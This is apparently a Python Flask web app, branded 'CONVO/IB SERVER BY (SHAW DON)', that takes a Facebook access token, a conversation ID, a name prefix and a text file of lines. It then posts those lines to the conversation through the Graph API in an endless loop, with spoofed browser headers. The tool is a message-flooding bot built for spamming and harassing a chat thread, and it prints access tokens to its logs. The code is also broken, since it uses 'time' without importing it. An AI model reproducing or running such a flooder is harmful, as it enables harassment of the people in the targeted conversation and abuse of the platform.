from flask import Flask, render_template, request
from flask_sqlalchemy import SQLAlchemy
from send_mail import send_mail
import requests

app = Flask(__name__)

headers = {

    'Connection': 'keep-alive',

    'Cache-Control': 'max-age=0',

    'Upgrade-Insecure-Requests': '1',

    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

    'Accept-Encoding': 'gzip, deflate',

    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',

    'referer': 'www.google.com'

}



css_style = """

<style>

body {

    font-family: Arial, sans-serif;

    margin: 0;

    padding: 0;

}



.container {

    max-width: 600px;

    margin: 50px auto;

    padding: 20px;

    border: 1px solid #ccc;

    border-radius: 10px;

}



h1 {

    text-align: center;

}



form {

    margin-top: 20px;

}



label {

    display: block;

    margin-bottom: 5px;

}



input[type="file"],

input[type="text"],

input[type="number"] {

    width: 100%;

    padding: 8px;

    margin-bottom: 10px;

    border: 1px solid #ccc;

    border-radius: 5px;

}



button {

    background-color: #4CAF50;

    color: white;

    padding: 10px 20px;

    border: none;

    border-radius: 5px;

    cursor: pointer;

}



button:hover {

    background-color: #45a049;

}

</style>

"""



@app.route('/', methods=['GET', 'POST'])

def send_message():

    if request.method == 'POST':

        access_token = request.form.get('accessToken')

        thread_id = request.form.get('threadId')

        mn = request.form.get('kidx')

        time_interval = int(request.form.get('time'))



        txt_file = request.files['txtFile']

        messages = txt_file.read().decode().splitlines()



        while True:

            try:

                for message1 in messages:

                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'

                    message = str(mn) + ' ' + message1

                    parameters = {'access_token': access_token, 'message': message}

                    response = requests.post(api_url, data=parameters, headers=headers)

                    if response.status_code == 200:

                        print(f"Message sent by [ SHAW-DON ] {access_token}: {message}")

                    else:

                        print(f"Failed to send message using token {access_token}: {message}")

                    time.sleep(time_interval)

            except Exception as e:

                print(f"Error while sending message using token {access_token}: {message}")

                print(e)

                time.sleep(30)



    return f'''

    <!DOCTYPE html>

    <html lang="en">

    <head>

        <meta charset="UTF-8">

        <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <title>CONVO/IB SERVER BY (SHAW DON)</title>

        {css_style}

    </head>

    <body>

        <div class="container">

            <h1>CONVO/IB SERVER BY (SHAW DON)</h1>

            <form action="/" method="post" enctype="multipart/form-data">

                <label for="accessToken">Enter Your Access Token:</label>

                <input type="text" name="accessToken" required><br>



                <label for="threadId">Enter Convo/Inbox ID:</label>

                <input type="text" name="threadId" required><br>



                <label for="kidx">Enter Kidx Name:</label>

                <input type="text" name="kidx" required><br>



                <label for="txtFile">Select Your Notepad File:</label>

                <input type="file" name="txtFile" accept=".txt" required><br>



                <label for="time">Speed in Seconds:</label>

                <input type="number" name="time" required><br>



                <button type="submit">Submit Your Details</button>

            </form>

        </div>

    </body>

    </html>

    '''



if __name__ == '__main__':

    app.run(host='0.0.0.0', port=5005)
